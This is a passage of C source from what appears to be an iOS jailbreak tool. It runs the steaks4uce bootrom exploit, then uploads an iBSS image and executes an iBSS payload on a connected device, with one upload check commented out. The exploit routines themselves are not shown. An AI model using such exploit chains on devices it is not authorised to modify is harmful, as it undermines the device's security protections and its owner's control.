		debug("Preparing to upload steaks4uce exploit\n");
		if(steaks4uce_exploit() < 0) {
			error("Unable to upload exploit data\n");
			return -1;
		}
#endif
	}
	else {
		error("Sorry, this device is not currently supported\n");
		return -1;
	}

	//////////////////////////////////////
	// Send iBSS
	debug("Preparing to upload iBSS\n");
	if(upload_ibss() < 0) {
		//error("Unable to upload iBSS\n");
		//return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 5);
	if (client == NULL) {
		error("Unable to reconnect\n");
		return -1;
	}

	debug("Preparing to upload iBSS payload\n");
	if(upload_ibss_payload() < 0) {
		error("Unable to upload iBSS payload\n");
		return -1;
	}

	debug("Executing iBSS payload\n");
	if(execute_ibss_payload() < 0) {
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	return 0;
}
